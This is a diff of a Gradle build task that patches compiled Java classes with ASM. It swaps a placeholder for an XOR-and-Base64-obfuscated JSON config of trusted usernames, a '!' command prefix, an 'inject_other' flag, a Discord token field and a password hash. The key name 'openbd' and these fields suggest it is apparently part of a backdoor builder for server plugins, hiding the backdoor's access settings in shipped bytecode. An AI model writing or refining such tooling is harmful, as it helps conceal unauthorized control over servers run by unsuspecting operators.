@@ -1,5 +1,6 @@
 package com.tmquan2508.gradle
 
+import groovy.json.JsonOutput
 import org.gradle.api.DefaultTask
 import org.gradle.api.file.DirectoryProperty
 import org.gradle.api.provider.Property
@@ -9,6 +10,7 @@ import org.gradle.api.tasks.OutputDirectory
 import org.gradle.api.tasks.TaskAction
 import org.objectweb.asm.ClassReader
 import org.objectweb.asm.ClassWriter
+import org.objectweb.asm.Opcodes
 import org.objectweb.asm.tree.*
 
 import java.nio.file.Files
@@ -18,6 +20,7 @@ import java.util.Base64
 abstract class InjectConfig extends DefaultTask {
 
     private static final String SECRET_KEY = "openbd.secret.key"
+    private static final String CONFIG_BLOB_PLACEHOLDER = "::CONFIG"
 
     @InputDirectory
     abstract DirectoryProperty getClassesDir()
@@ -28,15 +31,14 @@ abstract class InjectConfig extends DefaultTask {
     @Input
     abstract Property<String> getTargetClass()
 
-    private static final Map<String, String> REPLACEMENT_MAP = [
-            "::UUIDS::"        : "",
-            "::USERNAMES::"    : "Kudo,Vdung",
-            "::PREFIX::"       : "!",
-            "::INJECT_OTHER::" : "false",
-            "::WARNINGS::"     : "true",
-            "::DISCORD_TOKEN::": "",
-            "::PASSWORD::"     : "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5",
-            "::TRUE::"         : "true"
+    private static final Map<String, Object> CONFIG_DATA = [
+            "uuids"        : "",
+            "usernames"    : "Kudo,Vdung",
+            "prefix"       : "!",
+            "inject_other" : false,
+            "warnings"     : true,
+            "discord_token": "",
+            "password"     : "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5"
     ]
 
     byte[] xorEncrypt(String input) {
@@ -49,24 +51,29 @@ abstract class InjectConfig extends DefaultTask {
         return outputBytes
     }
 
-    boolean patchClassNode(ClassNode cn) {
+    boolean patchClassNode(ClassNode cn, String encryptedBlob, boolean debugFlag) {
         boolean changed = false
         cn.methods?.each { MethodNode mn ->
             mn.instructions?.each { AbstractInsnNode insn ->
                 if (insn instanceof LdcInsnNode) {
                     def cst = (insn as LdcInsnNode).cst
-                    if (cst instanceof String) {
-                        String s = (String) cst
-                        if (REPLACEMENT_MAP.containsKey(s)) {
-                            String originalVal = REPLACEMENT_MAP.get(s)
+                    if (cst instanceof String && cst == CONFIG_BLOB_PLACEHOLDER) {
+                        logger.lifecycle("  [LDC] in ${cn.name}.${mn.name}${mn.desc} -> replacing '${cst}' with encrypted JSON blob.")
+                        (insn as LdcInsnNode).cst = encryptedBlob
+                        changed = true
+                    }
+                }
+            }
 
-                            byte[] xorBytes = xorEncrypt(originalVal)
-                            String finalEncryptedVal = Base64.getEncoder().encodeToString(xorBytes)
-                            
-                            logger.lifecycle("  [LDC] in ${cn.name}.${mn.name}${mn.desc} -> replacing constant: '${s}' -> '${finalEncryptedVal}' (XOR + Base64 encrypted)")
-                            (insn as LdcInsnNode).cst = finalEncryptedVal
-                            changed = true
-                        }
+            if (debugFlag && mn.name == "initialize") {
+                def instructions = mn.instructions
+                for (int i = 0; i < instructions.size(); i++) {
+                    def insn = instructions.get(i)
+                    if (insn.getOpcode() == Opcodes.ICONST_0) {
+                        logger.lifecycle("  [OPCODE] in ${cn.name}.${mn.name}${mn.desc} -> replacing ICONST_0 with ICONST_1.")
+                        instructions.set(insn, new InsnNode(Opcodes.ICONST_1))
+                        changed = true
+                        break
                     }
                 }
             }
@@ -79,6 +86,11 @@ abstract class InjectConfig extends DefaultTask {
         def classesDirFile = classesDir.get().asFile
         def outputDirFile = outputClassesDir.get().asFile
         def targetClassName = targetClass.get()
+
+        String configJson = JsonOutput.toJson(CONFIG_DATA)
+        byte[] xorBytes = xorEncrypt(configJson)
+        String finalEncryptedBlob = Base64.getEncoder().encodeToString(xorBytes)
+        boolean finalDebugFlagValue = CONFIG_DATA.get("warnings") as boolean
 
         if (!classesDirFile.exists()) throw new RuntimeException("classes dir not found: " + classesDirFile)
         if (!outputDirFile.exists()) outputDirFile.mkdirs()
@@ -98,7 +110,7 @@ abstract class InjectConfig extends DefaultTask {
         ClassReader mainCr = new ClassReader(mainClassBytes)
         ClassNode mainCn = new ClassNode()
         mainCr.accept(mainCn, 0)
-        
+
         mainCn.innerClasses?.each { InnerClassNode icn ->
             if (icn.outerName == mainCn.name) {
                 logger.lifecycle("  [DISCOVERY] Found nested class: ${icn.name}")
@@ -114,20 +126,20 @@ abstract class InjectConfig extends DefaultTask {
         filesToProcess.unique().each { Path classFilePath ->
             logger.lifecycle("  [PATCH] Processing: " + classesDirFile.toPath().relativize(classFilePath))
             byte[] classBytes = Files.readAllBytes(classFilePath)
-            
+
             ClassReader cr = new ClassReader(classBytes)
             ClassNode cn = new ClassNode()
             cr.accept(cn, 0)
 
-            if (patchClassNode(cn)) {
-                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS)
+            if (patchClassNode(cn, finalEncryptedBlob, finalDebugFlagValue)) {
+                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES)
                 cn.accept(cw)
                 byte[] outBytes = cw.toByteArray()
 
                 Path targetOut = outputDirFile.toPath().resolve(classesDirFile.toPath().relativize(classFilePath))
                 Files.createDirectories(targetOut.getParent())
                 Files.write(targetOut, outBytes)
-                
+
                 logger.lifecycle("  [OK] Wrote patched class to " + targetOut)
             } else {
                 logger.lifecycle("  [INFO] No placeholders found in ${cn.name}. Skipping write.")
